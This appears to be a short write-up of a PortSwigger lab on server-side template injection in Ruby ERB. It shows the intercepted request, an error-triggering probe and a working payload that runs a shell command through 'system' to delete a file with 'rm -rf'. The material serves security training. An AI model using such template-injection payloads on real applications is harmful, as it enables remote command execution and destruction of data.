## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/5b17ef65-a3ef-4390-aa1b-69f5911f3586)

## Solution :

When we load the firest image in the website , we get the message that the *product is out of stock*

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/cac628eb-2b0c-47cf-b014-04baad860f0c)

The following is the GET request that was sent to us,

```http
GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/2
Host: 0ae800e104787954807bcde700900037.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0ae800e104787954807bcde700900037.web-security-academy.net/
Cookie: session=sfkb71a43M50TVtVZ8WBBtMftYCQ6Qwi
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
```

Since the lab says it is an **ERB** template, we can test if it is vulnerable by trying the following payload - `<%=..%>`

It throws an error response as expected.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/eb63ac7a-3aaf-44a7-932c-f055eb7c0d07)

Now we can try to run commands using the ERB template syntax & delete the *morale.txt* from carlos's home directory.

Payload used - 
```erb
<%= system('rm -rf /home/carlos/morale.txt') %>
```

Once we send this payload, the morale.txt file is deleted & the lab is solved.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/041ee417-6d45-42c2-9576-009e025e55ce)
